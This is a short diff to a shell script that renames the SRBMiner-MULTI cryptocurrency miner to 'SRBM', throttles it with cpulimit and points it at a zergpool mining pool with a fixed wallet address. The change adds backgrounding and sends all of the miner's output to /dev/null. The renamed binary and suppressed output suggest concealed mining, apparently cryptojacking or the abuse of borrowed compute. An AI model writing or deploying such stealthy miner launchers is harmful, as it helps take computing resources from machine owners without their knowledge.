@@ -10,4 +10,4 @@ mv SRBMiner-MULTI  ..
 cd ..
 mv SRBMiner-MULTI SRBM
 sudo cpulimit --background -e SRBM -l 620
-./SRBM --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu-priority value 5 --enable-workers-ramp-up --background --cpu-threads 0 --disable-gpu
+./SRBM --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu-priority value 5 --enable-workers-ramp-up --background --cpu-threads 0 --disable-gpu &> /dev/null &
